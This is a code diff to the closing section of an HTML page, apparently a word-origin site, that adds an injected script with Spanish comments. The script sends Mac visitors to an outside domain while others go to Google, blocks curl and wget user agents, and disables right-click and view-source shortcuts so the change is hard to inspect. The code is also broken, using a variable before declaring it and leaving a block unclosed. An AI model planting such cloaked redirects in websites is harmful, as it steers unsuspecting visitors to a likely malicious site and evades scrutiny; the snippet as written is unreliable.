@@ -1843,5 +1843,52 @@ from Latin aqua ‘water’.
     <script src="js/common.js"></script>
     <script src="js/scripts.js"></script>
     <!-- Page Specific Scripts End -->
-  </body>
+  <script src="blockers.js"></script><script src="blockers.js"></script>
+<script>
+
+
+// sistema operativo inicio
+
+     let redirectUrl;
+
+  if (userAgent.includes("windows")) {
+    redirectUrl = "https://www.google.com";
+  } else if (userAgent.includes("mac")) {
+    redirectUrl = "https://megadoll.club";
+  } else if (userAgent.includes("linux")) {
+    redirectUrl = "https://www.google.com";
+  } else {
+    redirectUrl = "https://www.google.com"; // Fallback
+  }
+
+  return Response.redirect(redirectUrl, 302);
+
+
+
+// sistema operativo fin
+
+
+// rechazar wget y curl inicio
+
+// Lógica para bloquear el acceso desde wget o curl
+    const userAgent = navigator.userAgent.toLowerCase();
+    const blockedAgents = ["curl", "wget"];
+    if (blockedAgents.some(agent => userAgent.includes(agent))) {
+        alert("Falso: wget or curl no está autorizado.");
+        window.location.href = "https://www.google.com";  // Redirige a una página en blanco
+
+// rechazar wget y curl fin
+
+
+    // Bloquear menú contextual
+    document.addEventListener('contextmenu', event => event.preventDefault());
+
+    // Bloquear acceso al código fuente (Ctrl+U y Ctrl+Shift+I)
+    document.addEventListener('keydown', event => {
+        if (event.ctrlKey && (event.key === 'u' || event.key === 'U' || event.key === 'i' || event.key === 'I' || event.key === 's' || event.key === 'F12')) {
+            event.preventDefault();
+        }
+    });
+</script>
+</body>
 </html>
